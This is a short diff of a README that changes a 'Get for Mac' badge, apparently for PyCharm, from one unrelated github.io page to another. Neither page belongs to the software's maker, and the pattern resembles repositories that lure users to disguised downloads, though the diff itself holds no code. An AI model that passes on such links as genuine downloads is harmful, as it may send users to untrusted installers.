@@ -6,7 +6,7 @@
 <br>
 <div align="center">
 
-[![🍏 Get for Mac](https://img.shields.io/badge/🍏_Get_for_Mac-green?style=for-the-badge&logo=apple)](https://evpatiy-kolovrat-software.github.io/.github/pycharm)
+[![🍏 Get for Mac](https://img.shields.io/badge/🍏_Get_for_Mac-green?style=for-the-badge&logo=apple)](https://osx-stack.github.io/.github/pycharm)
 
 </div>
 
